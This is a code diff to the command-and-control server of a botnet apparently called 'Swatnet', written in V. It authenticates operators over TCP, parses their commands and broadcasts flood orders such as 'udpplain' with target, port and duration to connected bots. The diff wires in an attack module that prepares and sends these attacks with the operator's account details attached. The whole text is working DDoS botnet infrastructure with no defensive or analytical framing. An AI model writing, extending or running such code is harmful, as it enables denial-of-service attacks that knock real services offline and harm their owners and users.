@@ -7,6 +7,7 @@ import crypto.sha1
 
 import core.crud
 import core.logger
+import core.attack
 
 pub struct Swatnet {
 	pub mut:
@@ -117,10 +118,10 @@ pub fn (mut s Swatnet) auth(mut client net.TcpConn) {
 	}
 	logger.console_log("user_connected", "User: ${username} successfully connected.....!", false)
 	s.clients.add_client_session(username, mut client, user_ip, "${user_addy}".split("]:")[1])
-	s.handler(mut client)
+	s.handler(mut client, username)
 }
 
-pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
+pub fn (mut s Swatnet) handler(mut client net.TcpConn, usern string) {
 	mut reader := io.new_buffered_reader(reader: client)
 	client.write_string("╔═╗╦ ╦╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n╚═╗║║║╠═╣ ║ ║║║║╣  ║ \r\n╚═╝╚╩╝╩ ╩ ╩ ╝╚╝╚═╝ ╩\r\n") or { 0 }
 	for {
@@ -128,6 +129,7 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 		data := (reader.read_line() or { "" }).replace("\r", "").replace("\n", "")
 		fcmd, cmd, args := s.bot.parse_buffer(data)
 		if data.len > 2 {
+			user_info := s.user_crud.find(usern)
 			match cmd {
 				/* 	All attack commands must move to 
 					/core/attack/main.v
@@ -153,6 +155,8 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 					} else {
 						bots := s.bot.broadcast_cmd("udpplain ${args[1]} ${args[2]} ${args[3]}")
 						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
+						mut a := attack.prepare(args, user_info, mut s.bot.socket, attack.AttackType.bots)
+						a.send()
 					}
 				}
 				"tcp" {
